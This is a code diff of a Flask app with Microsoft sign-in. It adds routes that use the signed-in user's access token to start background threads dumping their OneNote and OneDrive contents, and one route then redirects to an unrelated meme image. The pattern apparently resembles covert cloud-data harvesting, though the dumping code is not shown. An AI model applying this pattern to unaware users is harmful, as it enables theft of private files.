@@ -1,7 +1,8 @@
-from flask import Flask, redirect, render_template, request, session, url_for, jsonify
-from flask_session import Session
-from extractor.onenote import dump_onenote
-from threading import Thread
+from flask              import Flask, redirect, render_template, request, session, url_for, jsonify
+from flask_session      import Session
+from extractor.onenote  import dump_onenote
+from extractor.onedrive import dump_onedrive
+from threading          import Thread
 
 import identity
 import identity.web
@@ -61,18 +62,39 @@ def index():
     return render_template('index.html', user=auth.get_user(), version=identity.__version__)
 
 @app.route("/onenote")
-def onedrive():
+def onenote():
     notebook = list()
 
     token = auth.get_token_for_user(app_config.SCOPE)
     if "error" in token:
         return redirect(url_for("login"))
 
-    #dump_onenote(token['access_token'], auth.get_user())
+    #dump_onenote(token['access_token'], auth.get_user().get("preferred_username"))
     Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
 
     return render_template('tkt.html')
 
+@app.route("/onedrive")
+def onedrive():
+    token = auth.get_token_for_user(app_config.SCOPE)
+    if "error" in token:
+        return redirect(url_for("login"))
+    
+    # dump_onedrive(token['access_token'], auth.get_user().get("preferred_username"))
+    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+
+    return render_template('tkt.html')
+
+@app.route("/oneall")
+def oneall():
+    token = auth.get_token_for_user(app_config.SCOPE)
+    if "error" in token:
+        return redirect(url_for("login"))
+    
+    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+
+    return redirect("https://preview.redd.it/xl32gp9rrmt01.jpg?auto=webp&s=4678d4eec316ad160a1d258abe98230152f24122")
 
 if __name__ == "__main__":
     app.run()
